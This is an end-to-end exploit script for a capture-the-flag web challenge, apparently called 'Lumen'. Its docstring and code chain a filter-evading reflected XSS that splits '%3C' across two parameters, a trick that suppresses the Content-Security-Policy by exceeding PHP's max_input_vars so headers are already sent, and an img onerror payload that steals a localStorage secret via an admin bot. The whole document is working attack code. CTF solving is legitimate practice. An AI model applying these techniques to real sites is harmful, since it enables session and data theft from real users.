#!/usr/bin/env python3
"""Lumen (FlagYard, WEB) - end-to-end solver.

    python3 solve.py http://<host>:<port>/

Chain
-----
1. Reflection.  ?p=view builds  $path = urldecode(clean($dir) . clean($file))  and echoes
   it raw into the 404 card.  clean() runs htmlspecialchars(ENT_QUOTES) and rejects the
   literal '%3c' -- but it is applied to each parameter *separately* while the sink is the
   *concatenation*, so 'dir' ending in '%3' and 'file' starting with 'C' smuggles one '<'.
   Everything else is percent-encoded, which htmlspecialchars leaves alone and the explicit
   urldecode() restores.

2. CSP.  Not bypassed -- suppressed.  PHP runs with -d display_errors=1 -d
   output_buffering=0 -d max_input_vars=1000.  Sending >1000 GET variables makes PHP print
   "Input variables exceeded 1000" during *request startup*, i.e. before index.php executes.
   That output flushes the response head, so header('Content-Security-Policy: ...') on line 3
   fails with "headers already sent" and the page is served with no policy at all.  An
   ordinary inline onerror handler then runs.

3. Exfiltration.  The payload reads localStorage['flag'] (seeded by bot.js on /?p=home) and
   stores it same-origin via ?p=trace&id=<id>&note=<flag>; we read it back with ?p=trace&id=<id>.
   This needs no outbound network and would survive even if the CSP were still present,
   because img-src is 'self'.
"""
import html
import re
import secrets
import sys
import time
import urllib.parse
import urllib.request

JUNK_VARS = 1200          # must exceed max_input_vars=1000
POLL_SECONDS = 60


def pct(s: str) -> str:
    return urllib.parse.quote(s, safe="")


def build_query(payload_html: str) -> str:
    """Percent-encode the payload and split its single '<' across the dir/file boundary."""
    assert payload_html.count("<") == 1, "only one dir/file boundary is available"
    v = pct(payload_html)
    i = v.upper().index("%3C")
    v_dir, v_file = v[: i + 2], v[i + 2 :]          # '...%3' | 'C...'
    for half in (v_dir, v_file):
        assert "%3c" not in half.lower(), "clean() would reject this half"
    return (
        "?p=view&dir=" + pct(v_dir) + "&file=" + pct(v_file)
        + "".join("&%d" % n for n in range(1, JUNK_VARS + 1))
    )


def payload(trace_id: str) -> str:
    # String.fromCharCode(38) keeps '&' out of the HTML attribute entirely.
    js = (
        "var S=String.fromCharCode(38);"
        "new Image().src='/?p=trace'+S+'id=" + trace_id + "'+S+'note='"
        "+encodeURIComponent(localStorage.getItem('flag'))"
    )
    return '<img src=x onerror="%s">' % js


def get(url: str) -> str:
    with urllib.request.urlopen(url, timeout=20) as r:
        return r.read().decode("utf-8", "replace")


def post(url: str, data: dict) -> str:
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body)
    with urllib.request.urlopen(req, timeout=20) as r:
        return r.read().decode("utf-8", "replace")


def main() -> int:
    if len(sys.argv) > 1 and sys.argv[1] in ("-h", "--help"):
        print(__doc__.strip())
        return 0
    base = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000/").rstrip("/") + "/"
    trace_id = "t" + secrets.token_hex(8)           # matches ^[A-Za-z0-9]{8,64}$

    # The bot rewrites any submitted URL to SELF + pathname+search+hash, so the host we put
    # here is irrelevant -- only the query string travels.
    target = "http://127.0.0.1:5000/" + build_query(payload(trace_id))

    print("[*] target      %s" % base)
    print("[*] trace id    %s" % trace_id)
    print("[*] payload url %d bytes" % len(target))

    r = post(base + "?p=report", {"url": target})
    if "Queued" not in r:
        print("[!] report was rejected"); return 1
    print("[+] queued for the operator")

    deadline = time.time() + POLL_SECONDS
    while time.time() < deadline:
        body = get(base + "?p=trace&id=" + trace_id)
        m = re.search(r"<pre>(.*?)</pre>", body, re.S)
        if m:
            # PHP already url-decoded note=; the page only html-escapes it on read.
            flag = html.unescape(m.group(1)).strip()
            print("[+] FLAG: " + flag)
            return 0
        time.sleep(2)

    print("[!] no trace written within %ds" % POLL_SECONDS)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
